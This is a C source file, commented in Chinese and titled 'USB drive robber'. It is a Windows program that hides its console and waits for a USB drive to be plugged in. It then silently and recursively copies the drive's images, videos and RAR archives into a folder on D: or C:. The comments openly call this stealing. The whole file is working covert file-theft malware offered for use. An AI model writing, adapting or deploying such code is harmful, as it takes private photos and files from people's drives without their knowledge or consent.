/****电脑U盘强盗*****/
#include<stdio.h>
#include<Windows.h>	 
char savepath[100];//保存密码文件的路径
/*调试时显示控制台，单独运行exe时隐藏控制台。*/
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
bool IsDirExist(const char csDir[])//用于判断文件夹是否存在
{
	DWORD dwAttrib = GetFileAttributes(csDir);
	return INVALID_FILE_ATTRIBUTES != dwAttrib && 0 != (dwAttrib & FILE_ATTRIBUTE_DIRECTORY);
}
void  FindFile(char* FileName, int* recount) {//recount记录拷贝的文件数
	//U盘文件网罗
	//FileName "F:"	-->"G:\\*.*"  所有类型文件
	char Path[300] = { 0 };

	sprintf(Path, "%s\\*.*", FileName);//将文件基本名称格式化输入到Path中
	WIN32_FIND_DATA  FileSome;//文件属性,如名称，修改时间，大小，
	HANDLE UFrist/*句柄,标识第一个文件目录*/ = FindFirstFile(Path, &FileSome);//查找，把U盘中第一个文件（例如Path为G:\\*.*）的属性放在 FileSome中 
	char temmPath[500] = { 0 };
	while (1) {
		if (FileSome.dwFileAttributes/*文件属性*/ == FILE_ATTRIBUTE_DIRECTORY/*目录文件，即文件夹*/) {//如果是文件夹
			if (FileSome.cFileName[0]/*文件名称第一个字*/ != '.') {	  //过滤掉. ..文件夹（隐藏文件夹）
				printf("%s\n", FileSome.cFileName);//显示文件夹名称
				sprintf(temmPath, "%s\\%s", FileName, FileSome.cFileName);
				FindFile(temmPath, recount);	 //递归找所有文件 额与树的先序遍历相似?
			}
		}

		else {	//如果是文件	 
			//printf("%s\n", FileSome.cFileName);
			if (strstr(FileSome.cFileName, ".jpg") ||		//搜索目标文件
				strstr(FileSome.cFileName, ".png") ||
				strstr(FileSome.cFileName, ".amv") ||
				strstr(FileSome.cFileName, ".rmvb") ||
				strstr(FileSome.cFileName, ".avi") ||
				strstr(FileSome.cFileName, ".mp4") ||
				strstr(FileSome.cFileName, ".rar"))
			{
				++* recount;//得到文件加一
				sprintf(temmPath, "%s\\%s", FileName, FileSome.cFileName);//temmpath为目标文件地址信息
				sprintf(savepath, "%s", "D:\\我的小黑屋");//默认保存文件的地址(❁´◡`❁)
				if (IsDirExist(savepath));
				else
				{
					if (CreateDirectory(savepath, NULL))printf("1");	//创建文件夹，若有该文件夹则自动忽略 或创建失败，执行else语句，重新创建
					else {
						sprintf(savepath, "%s", "C:\\我的小黑屋");//备用地址以防有些人电脑没有D盘，没有D盘，C盘总该有了吧/doge
						CreateDirectory(savepath, NULL);
					}
				}

				char mypath[300] = { 0 };//记录文件名地址信息
				sprintf(mypath, "%s\\%s", savepath, FileSome.cFileName);

				CopyFile(temmPath, mypath, TRUE);//复制文件

			}
		}
		int ret = FindNextFile(UFrist/*使用第一个文件的句柄*/, &FileSome); //返回值为1或0；1为有文件，0为找不到文件
		if (ret == 0)break;

	}
}
int main() {

	char diskPath[5] = { 0 };//U盘文件拷贝 盘符名储存
	int count = 0;//记录已盗取多少文件 初始化为0
	while (1) {	     //检测U盘插入

		/*无符号长整形*/unsigned long disk/*64位(超过32位，32位也可使用) 4字节*/ = GetLogicalDrives(); //获取磁盘信息
		for (int i = 0; i < 64; i++) {
			if (disk & 1 == 1) {//按位与计算	存在一个盘符
				sprintf(diskPath, "%c:", 'A' + i);//格式化输入到diskPath
				if (GetDriveType(diskPath) == DRIVE_REMOVABLE) {	//检测是否为可移动磁盘，即U盘
					break;//跳出for循环
				}
			}
			disk = disk >> 1;//disk所有位右移
		}
		if (GetDriveType(diskPath) == DRIVE_REMOVABLE) {
			printf("U盘已插入 %s盘\n", diskPath); //U盘插入证明
			break;
		}
	}
	FindFile(diskPath, &count);//返回值为已经拷贝的文件数
	if (!count)
		printf("未搜索到任何指定文件！(此次盗取失败，不会在D盘产生文件夹)\n");
	else
		printf("此次盗取成功，一共有%d个文件被获取\n保存在%s", count, savepath);
	while (1);
	return 0;
}